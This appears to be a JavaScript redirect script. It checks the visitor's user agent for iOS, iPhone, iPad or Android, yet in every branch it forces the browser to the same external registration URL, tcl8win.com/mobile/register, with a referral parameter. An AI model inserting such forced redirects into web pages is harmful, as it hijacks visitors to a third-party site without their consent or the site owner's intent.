var browser = {
	versions: function () {
		var u = navigator.userAgent,
			app = navigator.appVersion;
		return {
			android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
			ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
			iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1,
			iPad: u.indexOf('iPad') > -1,
		};
	} ()
};
if (browser.versions.ios || browser.versions.iPhone || browser.versions.iPad) {
	window.location.href = "http://tcl8win.com/mobile/register?up=tclwins3";
	}else if (browser.versions.android) {
	window.location.href = "http://tcl8win.com/mobile/register?up=tclwins3";
}else{
	window.location.href = "http://tcl8win.com/mobile/register?up=tclwins3";
}
